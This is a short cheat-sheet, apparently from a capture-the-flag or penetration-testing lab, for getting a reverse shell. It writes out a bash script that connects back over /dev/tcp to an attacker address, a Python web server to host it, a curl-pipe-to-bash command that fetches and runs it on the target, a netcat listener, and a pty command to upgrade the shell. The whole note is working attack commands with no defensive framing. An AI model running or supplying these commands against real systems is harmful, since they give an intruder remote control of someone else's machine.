create bash script rev.sh with content:
#!/bin/bash
bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1

# run server and expose rev.sh as file:
python3 -m http.server 80

# on remote machine call:
curl 10.10.14.106/rev.sh|bash

# on local machine call:
netcat -lnvp 1337

# to spawn a bash:
python -c 'import pty; pty.spawn("/bin/bash")'

# to make if fully interactive:
https://gist.github.com/oscar-rk/f27464d7ab0c1fac4adf383b8a3527d3
